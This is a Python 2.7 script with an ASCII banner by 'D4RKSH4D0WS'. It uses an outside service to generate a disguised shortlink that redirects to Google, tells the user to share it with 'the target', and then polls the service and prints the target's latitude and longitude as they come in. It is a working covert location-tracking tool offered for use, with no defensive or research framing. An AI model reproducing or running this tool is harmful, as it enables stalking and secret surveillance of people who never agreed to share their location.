#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
#Maklum kalo berantakan ster
G = '\033[0;32m'
C = '\033[0;36m'
W = '\033[0;37m'
R = '\033[0;31m'
Y = '\033[0;33m'
import requests,json,time,os
from datetime import datetime
def gps(title,name):
	api=requests.post('https://gpstracker.seccodeid.com/server//server.php',data={'type':'generate','title':title,'shortlink_name':name,'redirect':'https://google.com'}).json()
	if 'already exists' in str(api):raw_input('%s[%s!%s] Name already exists\n    enter'%(W,R,W));main()
	elif api['data']['link']==None:raw_input('%s[%s!%s] Failed create link\n    enter'%(W,R,W));main()
	print '%s[%s!%s] Share the link to the target : %s'%(W,R,W,api['data']['link'])
	res_loc=[]
	print '%s[%s!%s] Waiting targets, press ctrl + c to exit ...\n'%(W,R,W)
	while True:
		try:
			#track=requests.get('https://gpstracker.seccodeid.com/server//server.php?id=1b643b542cc599d657d67f70363b0a18&type=get').json()['data']
			track=requests.get('https://gpstracker.seccodeid.com/server//server.php?id=%s&type=get'%(api['data']['id'])).json()['data']
			for arz in track:
				loc=json.loads(arz)['data']['lat']+','+json.loads(arz)['data']['lon']
				if loc in res_loc:continue
				else:res_loc.append(loc);print '%s[%s%s%s] Location : %s\n'%(W,G,datetime.now().strftime('%H:%M:%S'),W,loc)
		except ValueError:pass
		time.sleep(2)
def logo():
	os.system('clear')
	print '''%s
  __________________  _________
 /  _____/\______   \/   _____/  %sCoded by D4RKSH4D0WS%s
/   \  ___ |     ___/\_____  \   %sWA wa.me/628996604524%s
\    \_\  \|    |    /        \  %sFB https://bit.ly/2GjT1AZ%s
 \______  /|____|   /_______  /  TRACKER
        \/                  \/
	'''%(C,W,C,W,C,W,C)
def main():
	try:
		logo()
		title=raw_input('%s[%s?%s] Input title : '%(W,Y,W))
		if title=='':print '%s[%s!%s] Fuck'%(W,R,W);time.sleep(1);main()
		name=raw_input('%s[%s?%s] Input name : '%(W,Y,W))
		if name=='':print '%s[%s!%s] Fuck'%(W,R,W);time.sleep(1);main()
		gps(title,name)
	except requests.exceptions.ConnectionError:
		exit('%s[%s!%s] Check internet'%(W,R,W))
	except KeyboardInterrupt:
		exit('%s[%s!%s] Exit'%(W,R,W))
if __name__=='__main__':
	main()
